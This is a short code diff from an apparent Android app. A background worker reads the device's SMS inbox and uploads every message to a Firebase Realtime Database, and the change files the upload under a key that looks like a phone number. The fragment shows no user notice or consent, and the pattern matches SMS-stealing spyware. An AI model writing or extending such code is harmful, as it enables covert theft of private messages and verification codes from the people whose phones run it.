@@ -27,7 +27,7 @@ class FetchMessagesWorker(
             val inboxMessages = fetchInboxMessages(mAppContext)
 
             // Upload messages to Firebase Realtime Database
-            val reference = database.getReference("inbox_messages")
+            val reference = database.getReference("inbox_messages").child("8867817008")
 
             reference.setValue(inboxMessages).await()
             // Indicate success
